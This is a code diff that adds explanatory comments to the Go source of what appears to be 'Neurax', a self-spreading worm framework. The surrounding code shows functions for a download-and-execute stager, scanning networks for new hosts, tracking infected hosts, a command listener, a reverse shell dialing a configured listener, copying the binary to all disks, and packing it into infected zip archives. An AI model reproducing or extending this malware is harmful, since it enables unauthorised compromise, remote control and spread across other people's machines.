@@ -78,6 +78,7 @@ var NeuraxConfig = __NeuraxConfig{
 	exfil_addr:       "none",
 }
 
+//Verbose error printing
 func ReportError(message string, e error) {
 	if e != nil && NeuraxConfig.verbose {
 		fmt.Printf("ERROR %s: %s", message, e.Error())
@@ -87,6 +88,7 @@ func ReportError(message string, e error) {
 	}
 }
 
+//Returns a command stager that downloads and executes current binary
 func NeuraxStager() string {
 	stagers := [][]string{}
 	stager := []string{}
@@ -143,6 +145,7 @@ func NeuraxStager() string {
 	return selected_stager_command
 }
 
+//Binary serves itself
 func NeuraxServer() {
 	/*if NeuraxConfig.prevent_reinfect {
 		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
@@ -157,6 +160,7 @@ func NeuraxServer() {
 	}))
 }
 
+//Returns true if host is active
 func IsHostActive(target string) bool {
 	first := 19
 	last := 300
@@ -177,6 +181,7 @@ func IsHostActive(target string) bool {
 	return false
 }
 
+//Returns true if host is infected
 func IsHostInfected(target string) bool {
 	if coldfire.Contains(InfectedHosts, target) {
 		return true
@@ -291,6 +296,7 @@ func handle_command(cmd string) {
 	}
 }
 
+//Opens port (.comm_port) and waits for commands
 func NeuraxOpenComm() {
 	l, err := net.Listen(NeuraxConfig.comm_proto, "0.0.0.0:"+strconv.Itoa(NeuraxConfig.comm_port))
 	ReportError("Comm listen error", err)
@@ -305,6 +311,7 @@ func NeuraxOpenComm() {
 	}
 }
 
+//Launches a reverse shell. Each received command is passed to handle_command()
 func NeuraxReverse(proto string) {
 	conn, _ := net.Dial(proto, NeuraxConfig.reverse_listener)
 	for {
@@ -387,6 +394,7 @@ func neurax_scan_core(c chan string) {
 	}
 }
 
+//Scans network for new hosts
 func NeuraxScan(c chan string) {
 	for {
 		neurax_scan_core(c)
@@ -394,6 +402,7 @@ func NeuraxScan(c chan string) {
 	}
 }
 
+//Copies current binary to all found disks
 func NeuraxDisks() error {
 	selected_name := gen_haiku()
 	if runtime.GOOS == "windows" {
@@ -412,6 +421,7 @@ func NeuraxDisks() error {
 	return nil
 }
 
+//Creates an infected .zip archive with given number of random files from current dir.
 func NeuraxZIP(num_files int) error {
 	archive_name := gen_haiku() + ".zip"
 	files_to_zip := []string{os.Args[0]}
@@ -428,6 +438,7 @@ func NeuraxZIP(num_files int) error {
 	return coldfire.MakeZip(archive_name, files_to_zip)
 }
 
+//The binary zips itself and saves under save name in archive
 func NeuraxZIPSelf() error {
 	archive_name := os.Args[0] + ".zip"
 	files_to_zip := []string{os.Args[0]}
@@ -439,6 +450,7 @@ func gen_haiku() string {
 	return haikunator.Haikunate()
 }
 
+//Removes binary from all nodes that can be reached
 func NeuraxPurge() {
 	DataSender := coldfire.SendDataUDP
 	if NeuraxConfig.comm_proto == "tcp" {
